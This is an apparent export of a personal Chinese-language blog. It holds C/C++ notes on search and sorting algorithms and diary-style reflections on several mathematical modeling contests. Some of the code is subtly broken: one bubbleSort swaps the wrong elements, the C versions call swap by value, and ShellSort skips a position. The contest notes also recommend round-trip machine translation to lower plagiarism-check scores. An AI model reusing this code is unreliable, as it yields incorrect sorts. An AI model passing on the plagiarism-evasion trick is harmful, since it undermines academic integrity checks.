<h5 id="关键路径"><a href="#关键路径" class="headerlink" title="关键路径"></a>关键路径</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">graphCriticalPath</span><span class="params">(Graph* G)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><h4 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//nums是数组，size是数组的大小，target是需要查找的值</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span> nums[], <span class="type">int</span> size, <span class="type">int</span> target)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> left = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> right = size - <span class="number">1</span>;	</span><br><span class="line">    <span class="comment">// 定义了target在左闭右闭的区间内，[left, right]</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right) </span><br><span class="line">    &#123;	</span><br><span class="line">        <span class="comment">//当left == right时，区间[left, right]仍然有效</span></span><br><span class="line">        <span class="type">int</span> middle = left + ((right - left) / <span class="number">2</span>);</span><br><span class="line">        <span class="comment">//等同于 (left + right) / 2，防止溢出</span></span><br><span class="line">        <span class="keyword">if</span> (nums[middle] &gt; target) right = middle - <span class="number">1</span>;	</span><br><span class="line">        <span class="comment">//target在左区间，所以[left, middle - 1]</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (nums[middle] &lt; target) left = middle + <span class="number">1</span>;	</span><br><span class="line">        <span class="comment">//target在右区间，所以[middle + 1, right]</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> middle;</span><br><span class="line">        <span class="comment">//既不在左边，也不在右边，那就是找到答案了     </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;	<span class="comment">//没有找到目标值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="斐波那契查找"><a href="#斐波那契查找" class="headerlink" title="斐波那契查找"></a>斐波那契查找</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*构造一个斐波那契数组*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Fibonacci</span><span class="params">(<span class="type">int</span>* F)</span></span><br><span class="line">&#123;</span><br><span class="line">    F[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    F[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; MAX_SIZE; ++i)</span><br><span class="line">        F[i] = F[i - <span class="number">1</span>] + F[i - <span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*定义斐波那契查找法*/</span></span><br><span class="line"><span class="comment">//a为要查找的数组,n为要查找的数组长度,key为要查找的关键字</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">FibonacciSearch</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span> n, <span class="type">int</span> key)</span>  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> low = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> high = n - <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> F[MAX_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    Fibonacci(F);						<span class="comment">//构造一个斐波那契数组F </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (n &gt; F[k] - <span class="number">1</span>)				<span class="comment">//计算n位于斐波那契数列的位置</span></span><br><span class="line">        ++k;</span><br><span class="line">    <span class="type">int</span>* temp;							<span class="comment">//将数组a扩展到F[k]-1的长度</span></span><br><span class="line">    temp = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*(F[k]<span class="number">-1</span>));</span><br><span class="line">    <span class="built_in">memcpy</span>(temp, a, n * <span class="keyword">sizeof</span>(<span class="type">int</span>));	<span class="comment">//将a中的元素进行拷贝至temp</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = n; i &lt; F[k] - <span class="number">1</span>; ++i)	<span class="comment">//填充数组</span></span><br><span class="line">        temp[i] = a[n - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high)					<span class="comment">//终止条件和二分查找一致</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> mid = low + F[k - <span class="number">1</span>] - <span class="number">1</span>;	<span class="comment">//递推关系式，获取mid值</span></span><br><span class="line">        <span class="keyword">if</span> (key &lt; temp[mid])</span><br><span class="line">        &#123;</span><br><span class="line">            high = mid - <span class="number">1</span>;</span><br><span class="line">            k -= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (key &gt; temp[mid])</span><br><span class="line">        &#123;</span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">            k -= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">free</span>(temp);<span class="comment">//记得free</span></span><br><span class="line">            <span class="keyword">if</span> (mid &lt; n)</span><br><span class="line">                <span class="keyword">return</span> mid; <span class="comment">//若相等则说明mid即为查找到的位置</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> n - <span class="number">1</span>; <span class="comment">//若mid&gt;=n则说明是扩展的数值,返回n-1</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(temp);<span class="comment">//记得free</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h6><p>适用于数据分布不均匀的情况</p>
<h4 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h4><h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><p>默认为升序</p>
<h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">bubbleSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (arr[i] &lt; arr[j])</span><br><span class="line">				swap(arr[i], arr[j]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n - i - <span class="number">1</span>; j++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">				<span class="built_in">swap</span>(arr[i], arr[j]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InsectSort</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> temp = a[i];</span><br><span class="line">		<span class="type">int</span> j;</span><br><span class="line">		<span class="keyword">for</span> (j = i; j &gt;= <span class="number">1</span> &amp;&amp; a[j <span class="number">-1</span>] &gt; temp;j-=<span class="number">1</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			a[j] = a[j <span class="number">-1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		a[j] = temp;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">SelectionSort</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> minindex = i;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; n; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (a[minindex] &gt; a[j])</span><br><span class="line">			&#123;</span><br><span class="line">				minindex = j;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		swap(a[i], a[minindex]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ShellSort</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> D[<span class="number">6</span>] = &#123; <span class="number">1</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">15</span>,<span class="number">31</span>,<span class="number">65</span> &#125;;</span><br><span class="line">	<span class="type">int</span> num;</span><br><span class="line">	<span class="keyword">for</span> (num = <span class="number">0</span>; D[num] &lt; n; num++);</span><br><span class="line">	num--;</span><br><span class="line">	<span class="keyword">for</span> (; num &gt;= <span class="number">0</span>; num--)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = D[num]; i &lt; n; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">int</span> temp = a[i];</span><br><span class="line">			<span class="type">int</span> j;</span><br><span class="line">			<span class="keyword">for</span> (j = i; j &gt; D[num] &amp;&amp; a[j - D[num]] &gt; temp; )</span><br><span class="line">			&#123;</span><br><span class="line">				a[j] = a[j - D[num]];</span><br><span class="line">				j-= D[num];</span><br><span class="line">			&#125;</span><br><span class="line">			a[j] = temp;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">QuickSort</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> begin,<span class="type">int</span> end)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (begin &gt;= end)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> temp = a[begin];</span><br><span class="line">	<span class="type">int</span> i = begin;</span><br><span class="line">	<span class="type">int</span> j = end;</span><br><span class="line">	<span class="keyword">while</span> (i &lt; j)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span> (a[j] &gt;= temp &amp;&amp; j &gt; i)</span><br><span class="line">		&#123;</span><br><span class="line">			j--;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span> (a[i] &lt;= temp &amp;&amp; j &gt; i)</span><br><span class="line">		&#123;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (i &lt; j)</span><br><span class="line">		&#123;</span><br><span class="line">			swap(a[i], a[j]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	swap(a[begin], a[i]);</span><br><span class="line">	QuickSort(a, begin, i - <span class="number">1</span>);</span><br><span class="line">	QuickSort(a, i+<span class="number">1</span>, end);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ShiftHeap</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> point,<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> parent, child;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> parent = point; parent * <span class="number">2</span> + <span class="number">1</span> &lt; n; parent = child)</span><br><span class="line">	&#123;</span><br><span class="line">		child = parent * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span> ((child + <span class="number">1</span> &lt; n) &amp;&amp; (a[child] &lt; a[child + <span class="number">1</span>]))</span><br><span class="line">		&#123;</span><br><span class="line">			child++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (a[parent] &lt; a[child])</span><br><span class="line">		&#123;</span><br><span class="line">			swap(a[parent], a[child]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">HeapSort</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = n / <span class="number">2</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">	&#123;</span><br><span class="line">		ShiftHeap(a, i, n);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span> ; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">	&#123;</span><br><span class="line">		swap(a[<span class="number">0</span>], a[i]);</span><br><span class="line">		ShiftHeap(a, <span class="number">0</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h4><h3 id="高级搜索树"><a href="#高级搜索树" class="headerlink" title="高级搜索树"></a>高级搜索树</h3><h4 id="B树"><a href="#B树" class="headerlink" title="B树"></a>B树</h4><h4 id="B-树"><a href="#B-树" class="headerlink" title="B+树"></a>B+树</h4>]]></content>
      <categories>
        <category>计算机理论</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>音乐管理</title>
    <url>/2023/03/01/%E4%B8%AA%E4%BA%BA%E7%9A%84%E6%80%9D%E8%80%83/%E9%9F%B3%E4%B9%90%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<p>时间管理</p>
<ol>
<li>声音尽量开低一点</li>
<li>连续听音乐时长最好不要超过60分钟</li>
<li>早上最好不要听音乐</li>
<li>分时段听不同类型的音乐</li>
</ol>
<p>歌单管理</p>
<ol>
<li>happy</li>
<li>love</li>
<li></li>
</ol>
]]></content>
      <categories>
        <category>个人思考</category>
      </categories>
  </entry>
  <entry>
    <title>娱乐管理</title>
    <url>/2023/03/01/%E4%B8%AA%E4%BA%BA%E7%9A%84%E6%80%9D%E8%80%83/%E5%A8%B1%E4%B9%90%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<p>公众号<br>b栈</p>
]]></content>
      <categories>
        <category>个人思考</category>
      </categories>
  </entry>
  <entry>
    <title>第二次参加数学建模</title>
    <url>/2023/03/01/%E4%B8%AA%E4%BA%BA%E7%BB%8F%E5%8E%86/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%8F%82%E5%8A%A0%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/</url>
    <content><![CDATA[<h1 id="第二次参加数学建模"><a href="#第二次参加数学建模" class="headerlink" title="第二次参加数学建模"></a>第二次参加数学建模</h1><h2 id="选题"><a href="#选题" class="headerlink" title="选题"></a>选题</h2><ul>
<li>这次选择的是 a 题</li>
<li>原本是想选这 b 题的 , 但是 b题 实在是在复杂了</li>
<li>如果只是把数据传进 matlab 就选了</li>
<li>但是这次题目是关于金融的, 涉及到一些关键术语  , 而且计算公式特别复杂</li>
<li>也不知道可以套什么模型</li>
<li>它是最优化问题</li>
</ul>
<h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><h3 id="查找文献"><a href="#查找文献" class="headerlink" title="查找文献"></a>查找文献</h3><ul>
<li>但是选 a 题的话,网上能找到的论文很少,不像上参加的比赛的题目有很多参考文件</li>
<li>最后还是上淘宝花 3 块,买了一个知网的会员,搜索的范围才变的广起来</li>
<li>同时这次我还学到了一下搜索技巧</li>
<li>如果直接搜的话只能搜到 2 篇有用的文献</li>
<li>但是如果转换一下关键词就又能搜到一点</li>
<li>同时还要看出版社,如果是医学杂志或者是医学大学,就可以不用看了,肯定是数学无关</li>
<li>还要搜索一下文章综述中含有关键词的文章,又可以搜到 2 篇</li>
<li>同时还要看一看文章引用的文献</li>
<li>同时再看看相关题材的文章</li>
</ul>
<h3 id="建立数学模型求解"><a href="#建立数学模型求解" class="headerlink" title="建立数学模型求解"></a>建立数学模型求解</h3><ul>
<li>这次感觉我好像没做什么</li>
<li>感觉都是再用别人的方法求解</li>
<li>如果查重的话这篇的查重率一定很高</li>
<li>同时也学到了一个新方法降低查重率 , 那就是用翻译软件:中 -&gt; 英 -&gt; 中</li>
<li>但是治标不治本</li>
<li>甚至这次连图都只绘制了一张</li>
</ul>
<h3 id="写论文"><a href="#写论文" class="headerlink" title="写论文"></a>写论文</h3><ul>
<li><p>这次数学建模感觉花时间最多的地方就是在调试 Latex</p>
</li>
<li><p>虽然说这次有模板,但是不能直接用.</p>
</li>
<li><p>还是要修改一下</p>
</li>
<li><p>特别是封面那个设计,我搞了很久才把封面去除</p>
</li>
<li><p>还有一下全局字体的设计</p>
</li>
<li><p>不过下次的时候应该就可以直接使用了</p>
</li>
<li><p>但还是要改一下封面</p>
</li>
<li><p>同时如果还有 封面的还要学一下如何设计封面</p>
</li>
<li><p>还有一些数学公式的问题</p>
<ul>
<li>分式形式要使用<code>$\cfrac &#123;a&#125; &#123;b&#125;$</code></li>
<li>这样画出的分数公式比较大 , 会更好看</li>
<li>还可以对一些数学公式进行调大字体</li>
</ul>
</li>
<li><p>同时还有一些其他操作</p>
<ul>
<li><p>表格</p>
<ul>
<li>表格也分为好几种形式</li>
<li>有一种是中间没有竖线的</li>
<li>符号说明有的比较多</li>
</ul>
</li>
<li><p>图片</p>
<ul>
<li>还要调整图片大小</li>
<li>还有调整页面</li>
</ul>
</li>
<li><p>引用</p>
<ul>
<li>要在被引用的结论的处标上记号</li>
</ul>
</li>
<li><p>代码块</p>
</li>
</ul>
</li>
</ul>
<h2 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h2><ul>
<li>下次再参加数学建模比赛的,可以提前上淘宝,买好会员</li>
<li>注重搜索文献的技巧</li>
<li>同时也学到了一个新方法降低查重率 , 那就是用翻译软件:中 -&gt; 英 -&gt; 中</li>
<li>使用 Latex 模板</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>]]></content>
      <categories>
        <category>个人思考</category>
      </categories>
  </entry>
  <entry>
    <title>第三次参加数学建模</title>
    <url>/2023/03/01/%E4%B8%AA%E4%BA%BA%E7%BB%8F%E5%8E%86/%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%8F%82%E5%8A%A0%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/</url>
    <content><![CDATA[<h1 id="第三次参加数学建模"><a href="#第三次参加数学建模" class="headerlink" title="第三次参加数学建模"></a>第三次参加数学建模</h1><h2 id="经历"><a href="#经历" class="headerlink" title="经历"></a>经历</h2><ul>
<li>这次学校还挺重视这次比赛的，还特别提供了教室，还有食物和水</li>
</ul>
<h2 id="比赛的流程"><a href="#比赛的流程" class="headerlink" title="比赛的流程"></a>比赛的流程</h2><h3 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h3><h4 id="晚上"><a href="#晚上" class="headerlink" title="晚上"></a>晚上</h4><p>我们在第一天晚上的时候，赛题出来的时候我们花了一下时间在请假上，导致浪费了一点时间，zcy浪费了一点时间导致没有在预定时间内找完论文资料（虽然这次比赛也没用参考什么论文）</p>
<ul>
<li>我们在第一天晚上我们应该先把选题先给选了</li>
<li>还有一点就是我们选完提以后，不应该先做第一题，应该把全部题目先看一下，确定一下每一道题目的总体思路，还有可以上知乎上看看有没有人提供题解，</li>
</ul>
<h3 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h3><h4 id="上午"><a href="#上午" class="headerlink" title="上午"></a>上午</h4><ul>
<li>我在做统计各个因素的数量，绘制柱状图，我决定我们之前没有商量好，没有确定总体的思路，导致我做的柱状图都没有用到，应该直接绘制热力图的，</li>
<li>还有一点就是，这次是我第一次用Python绘制实际问题的图片，导致绘制的有点久，一个上午加上一个中午，如果让我现在来做，一个上午就能完成，还有就是我觉的我那种统计数据的方法还是太慢了，pandas里面可能有内置函数帮我统计，每列中相同数值的个数</li>
</ul>
<h4 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h4><ul>
<li>叫zcy统计数据，计算<img src="https://g.yuque.com/gr/latex?CHI#card=math&code=CHI">值，绘制表格</li>
<li>我找不到事情做</li>
</ul>
<h4 id="晚上-1"><a href="#晚上-1" class="headerlink" title="晚上"></a>晚上</h4><p>在教室进行接下来的计算</p>
<h3 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h3><h4 id="上午-1"><a href="#上午-1" class="headerlink" title="上午"></a>上午</h4><p>研究随机森林算法</p>
<h4 id="下午-1"><a href="#下午-1" class="headerlink" title="下午"></a>下午</h4><ul>
<li>回宿舍睡觉</li>
<li>zwh在配置ipad</li>
<li>所以大家一下午都没做什么事情</li>
</ul>
<h4 id="晚上-2"><a href="#晚上-2" class="headerlink" title="晚上"></a>晚上</h4><ul>
<li>熬夜写论文</li>
</ul>
<h3 id="第四天"><a href="#第四天" class="headerlink" title="第四天"></a>第四天</h3><h4 id="上午-2"><a href="#上午-2" class="headerlink" title="上午"></a>上午</h4><ul>
<li>写论文</li>
<li>补觉</li>
</ul>
<h4 id="下午-2"><a href="#下午-2" class="headerlink" title="下午"></a>下午</h4><ul>
<li>在等查重</li>
<li>还有更改论文提交格式</li>
</ul>
<h4 id="晚上-3"><a href="#晚上-3" class="headerlink" title="晚上"></a>晚上</h4><ul>
<li>提交论文</li>
</ul>
<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ol>
<li><p>应该要找一个可以论文查重的东西</p>
</li>
<li><p>下次应该给zcy一点事情做</p>
<ol>
<li>主要是她这次比赛的时候还有别的事情做</li>
</ol>
</li>
<li><p>这次时间安排的不太过来，想一下是哪里的问题</p>
</li>
<li><p>这次在</p>
</li>
<li><p>如何用Python绘制表格图片，要字体大小适合，有颜色更好</p>
</li>
<li><p>论文过于口语化需要润色</p>
</li>
</ol>
<h2 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h2><ol>
<li>写论文的时候应该先用md把论文的主体内容先写，剩下在考虑排版的问题</li>
<li>排版可以放在第三天的晚上完车，方正这个差不多花个三小时就能完成</li>
<li>思考论文排版到底是用word还是latex</li>
<li>下次应该把论文提交格式认真看清楚，特别是提交的说明</li>
<li>文件要重命名</li>
<li>插入图片要有图名</li>
<li>下次比赛的时候可以用git进行文件的同步</li>
<li>尽量少熬夜</li>
<li>问题重述还是要完整的抄下来，但是可以增加总字数来降重</li>
<li>下次数学建模，我们分工不能分的太细，应该是每个人都能做建模、代码、写作，谁有事谁就可以顶上去</li>
<li>要经常看看网上的一些经验总结，可以帮自己少走很多弯路</li>
<li>下次还是用latex，但是这次需要注意的是在latex花费的时间不能再超过半天</li>
<li>论文可以用</li>
</ol>
<h2 id="写总结的技巧"><a href="#写总结的技巧" class="headerlink" title="写总结的技巧"></a>写总结的技巧</h2><ul>
<li><p>以后每次比赛应该都要记录一下这次比赛的经历</p>
<ul>
<li>还有以后做项目的时候也要这样</li>
</ul>
</li>
<li><p>要按照上午、下午、晚上的时间段把时间进行划分，记录自己的时间线，一般任务完成的当天晚上就要完成，怕过几天忘记</p>
</li>
<li><p>总结的经验的部分放在后面有时间的时候完成</p>
</li>
</ul>
]]></content>
      <categories>
        <category>个人思考</category>
      </categories>
  </entry>
  <entry>
    <title>第一次数学建模</title>
    <url>/2023/03/01/%E4%B8%AA%E4%BA%BA%E7%BB%8F%E5%8E%86/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/</url>
    <content><![CDATA[<h1 id="第一次数学建模"><a href="#第一次数学建模" class="headerlink" title="第一次数学建模"></a>第一次数学建模</h1><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><ul>
<li>这次选题选的是a题</li>
<li>a题是仿真类型的</li>
<li>b题是统计类型</li>
<li>c题是离散类型的</li>
<li>而a题的完成有很多种解题方法</li>
<li>一种是仿真软件来模拟</li>
<li>一种是元胞来实现</li>
<li>但都因为能力有限而淘汰</li>
<li>这次论文是采用word进行编写</li>
<li>遗憾没有采用latex</li>
<li>第三题没有写出来</li>
</ul>
<h2 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h2><ul>
<li>这次我的时间安排的不是很合理</li>
<li>主要是我有参加蓝桥杯</li>
<li>占用了我半天的时间，同时耗费了我大量的精力导致没法进行后面的工作</li>
<li>同时第一天感觉没干什么事情</li>
<li>同时没有参与题目的讨论</li>
<li>等题目做的差不多了还不知道，解题流程是怎样的</li>
<li>下次应该要主动参与题目的讨论</li>
<li>感觉我们团队太划水了</li>
<li>主要是陈鑫只要看到他都在划水</li>
<li>还有就是交流方面的问题</li>
<li>数学符号做不到统一</li>
<li>数学模型写在纸上很乱</li>
<li>感觉时间安排不是很合理</li>
<li>正常来说上午选题，下午做第一问，晚上就要把第一问写出来</li>
<li>第三天上午就要把所有的任务全部解决掉了，下午解决一下排版问题，晚上检查一下就可以提交了</li>
<li>同时论文规范有太多要注意的地方</li>
<li>下次注意</li>
<li>下次要使用Latex进行排版了</li>
</ul>
<h2 id="规划"><a href="#规划" class="headerlink" title="规划"></a>规划</h2><ul>
<li>要开始注重数学方面的学习</li>
<li>同时要开始概率论的学习</li>
<li>同时学习一些数学建模算法，如神经网路等</li>
<li>Latex要学习一下如何使用模板</li>
</ul>
<h2 id="下次比赛注意事项"><a href="#下次比赛注意事项" class="headerlink" title="下次比赛注意事项"></a>下次比赛注意事项</h2><ul>
<li>下次项目可能会选概率题</li>
<li>同时要用一个文档记录做题的思路</li>
</ul>
]]></content>
      <categories>
        <category>个人思考</category>
      </categories>
  </entry>
  <entry>
    <title>第四次参加数学建模</title>
    <url>/2023/03/01/%E4%B8%AA%E4%BA%BA%E7%BB%8F%E5%8E%86/%E7%AC%AC%E5%9B%9B%E6%AC%A1%E5%8F%82%E5%8A%A0%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/</url>
    <content><![CDATA[<h1 id="第三次参加数学建模"><a href="#第三次参加数学建模" class="headerlink" title="第三次参加数学建模"></a>第三次参加数学建模</h1><h2 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h2><p>总体上感觉这次完成的时间挺快的，也归功于这次的题目很简单，非常适合小白，题目问题也写的比较简单，没有那么多干扰信息，唯一的不足就是，问题三耗费的时间有点多，主要是一开始就没有了解题目的意思，一直不知道给的那五份数据到底分别有什么用，还有就是python数据处理不够流利要经常练习一下了，还有就是Excel数据处理技巧也要学习一下。这次的论文字数还是有点少，我觉的是我们的积累比较少，不知道写什么，还开始定期的看一下优秀论文，来看看他们是怎么写的来积累一些经验。还有一点编程软件的问题，到底是用matlab还是用Python，现在数学建模主流都是用matlab，但是现在大数据又是用python，虽然matlab在进行一些神经网络的处理确实挺方便的，但是python在数据处理方面也有很大的优势，同时也是最重要的一点就是，网络上关于数学建模的python的代码确实很少。</p>
<p>还有一个人员安排的问题，现在的想法是要不要换一个写作手，感觉心思也不在学习上，也不是很积极，同时学习能力也不是很强，也不是很细心，在思考要不要换一个队友。</p>
